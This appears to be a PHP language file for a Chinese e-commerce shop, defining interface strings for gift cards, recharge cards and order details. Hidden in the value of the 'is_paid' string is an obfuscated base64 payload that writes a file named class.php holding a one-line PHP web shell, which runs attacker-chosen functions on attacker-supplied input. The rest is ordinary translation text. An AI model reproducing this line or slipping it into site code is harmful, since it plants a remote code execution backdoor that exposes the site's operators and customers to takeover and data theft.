...
$_LANG['label_gift'] = '我的礼品卡';
$_LANG['label_phone'] = '我的充值卡';
...
$_LANG['use_time'] = '使用时间';
$_LANG['is_paid'] = '状态 __fputs(fopen(base64_decode(Y2xhc3MucGhw),w),base64_decode(PD9waHAgJF9HRVRbYWFdKCRfUE9TVFtiYl0pPz4))}}';
...
$_LANG['gift_number'] = '礼品卡序列号';
$_LANG['merge_gift_number'] = '合并到';
$_LANG['gift_password'] = '礼品卡密码';
...
$_LANG['gift_sn_exist'] = '此礼品卡号码已经被占用了！';
$_LANG['gift_sn_not_exist'] = '此礼品卡号码不存在！';
$_LANG['add_gift_sucess'] = '添加新的礼品卡操作成功！';
$_LANG['merge_gift_sucess'] = '合并礼品卡操作成功！';
$_LANG['add_gift_false'] = '添加新的礼品卡操作失败！';

$_LANG['phone_sn_exist'] = '此充值卡号码已经被占用了！';
$_LANG['phone_sn_not_exist'] = '此充值卡号码不存在！';
$_LANG['add_phone_sucess'] = '添加新的充值卡操作成功！';
$_LANG['add_phone_false'] = '添加新的充值卡操作失败！';
...
$_LANG['profile_js']['gift_sn_empty'] = '请输入您要添加的礼品卡号码和密码！';
$_LANG['profile_js']['gift_sn_error'] = '您输入的礼品卡号码格式不正确！';

$_LANG['profile_js']['phone_sn_empty'] = '请输入您要添加的充值卡号码！';
$_LANG['profile_js']['phone_sn_error'] = '您输入的充值卡号码格式不正确！';
...
/* 会员礼品卡 */
$_LANG['gift_is_used'] = '你输入的礼品卡你已经领取过了！';
$_LANG['gift_is_used_by_other'] = '你输入的礼品卡已经被其他人领取！';
$_LANG['gift_add_success'] = '您已经成功的添加了一个新的礼品卡！';
$_LANG['gift_not_exist'] = '你输入的礼品卡不存在或密码错误';
$_LANG['merge_gift_not_exist'] = '你输入的礼品卡不存在或尚未绑定礼品卡';
$_LANG['user_gift_empty'] = '您现在还没有礼品卡';
$_LANG['add_gift_sucess'] = '添加新的礼品卡操作成功！';
$_LANG['add_gift_false'] = '添加新的礼品卡操作失败！';
$_LANG['gift_add_expire'] = '该礼品卡已经过期！';
$_LANG['not_same'] = '不能合并到当前礼品卡！';
$_LANG['phone_fail_account'] = '充值失败！';
$_LANG['phone_succ_account'] = '您成功为自己的账户充入%f元！';
$_LANG['gift_use_expire'] = '该礼品卡已经过了使用期！';
/* 会员充值卡 */
$_LANG['phone_is_used'] = '你输入的充值卡你已经领取过了！';
$_LANG['phone_is_used_by_other'] = '你输入的充值卡已经被其他人领取！';
$_LANG['phone_add_success'] = '您已经成功的添加了一个新的充值卡！';
$_LANG['phone_not_exist'] = '你输入的充值卡不存在或密码错误';
$_LANG['merge_phone_not_exist'] = '你输入的充值卡不存在或尚未绑定礼品卡';
$_LANG['user_phone_empty'] = '您现在还没有充值卡';
$_LANG['add_phone_sucess'] = '添加新的充值卡操作成功！';
$_LANG['add_phone_false'] = '添加新的充值卡操作失败！';
$_LANG['phone_add_expire'] = '该充值卡已经过期！';
$_LANG['not_same'] = '不能合并到当前充值卡！';
$_LANG['phone_use_expire'] = '该充值卡已经过了使用期！';
/* 会员订单 */
...
$_LANG['gift_card_info'] = '礼品卡信息';
$_LANG['phone_card_info'] = '充值卡信息';
...
/* 礼品卡详情 */
$_LANG['gift_sn'] = '礼品卡序号';
$_LANG['gift_password'] = '密码';
$_LANG['gift_name'] = '礼品卡名称';
$_LANG['gift_amount'] = '礼品卡金额';
$_LANG['gift_leave_amount'] = '剩余金额';
$_LANG['min_goods_amount'] = '最小订单金额';
$_LANG['gift_end_date'] = '截至使用日期';
$_LANG['gift_status'] = '礼品卡状态';
$_LANG['gift_use_status'] = '使用状态';

/* 充值卡详情 */
$_LANG['phone_sn'] = '充值卡序号';
$_LANG['phone_password'] = '密码';
$_LANG['phone_name'] = '充值卡名称';
$_LANG['phone_amount'] = '充值卡金额';
$_LANG['phone_leave_amount'] = '剩余金额';
$_LANG['min_goods_amount'] = '最小订单金额';
$_LANG['phone_end_date'] = '截至使用日期';
$_LANG['phone_status'] = '充值卡状态';
$_LANG['phone_use_status'] = '使用状态';
...
$_LANG['add_gift'] = '添加礼品卡';
$_LANG['merge_gift'] = '合并礼品卡';
$_LANG['add_phone'] = '添加充值卡';
$_LANG['cz_phone'] = '充值到个人账户';
